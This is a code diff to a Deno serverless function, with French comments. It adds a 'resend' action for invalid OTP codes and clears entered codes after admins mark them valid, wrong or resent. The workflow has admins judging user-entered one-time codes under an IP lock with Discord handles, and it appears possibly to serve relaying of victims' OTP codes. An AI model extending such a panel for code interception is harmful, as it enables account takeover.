@@ -32,7 +32,7 @@ Deno.serve(async (req) => {
       return Response.json({ error: 'submissionId requis' }, { status: 400 });
     }
 
-    const newStatus = statusMap[action] || "code_ready";
+    let newStatus = statusMap[action] || "code_ready";
     const base44 = createClientFromRequest(req);
 
     // Get admin IP & user agent
@@ -40,6 +40,12 @@ Deno.serve(async (req) => {
 
     // Fetch submission details
     const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
+
+    // "resend" (OTP invalide — autoriser renvoi) : remet la demande dans le format
+    // de code précédemment demandé pour que l'utilisateur puisse ressaisir un code.
+    if (action === "resend") {
+      newStatus = sub?.last_ready_status || "code_ready";
+    }
 
     // ---- Verrou par IP admin : la première action (envoi de code / validation /
     // mauvais / expiré) verrouille la demande à cette IP et exige un pseudo Discord
@@ -95,7 +101,11 @@ Deno.serve(async (req) => {
       sub.admin_discord = discordClean;
     }
 
-    await base44.asServiceRole.entities.Submission.update(submissionId, { status: newStatus });
+    const clearOtp = ["valid", "wrong", "resend"].includes(action);
+    await base44.asServiceRole.entities.Submission.update(submissionId, {
+      status: newStatus,
+      ...(clearOtp ? { entered_code: null, last_ready_status: null } : {}),
+    });
     const userAgent = req.headers.get("user-agent") || "";
 
     // Detect browser
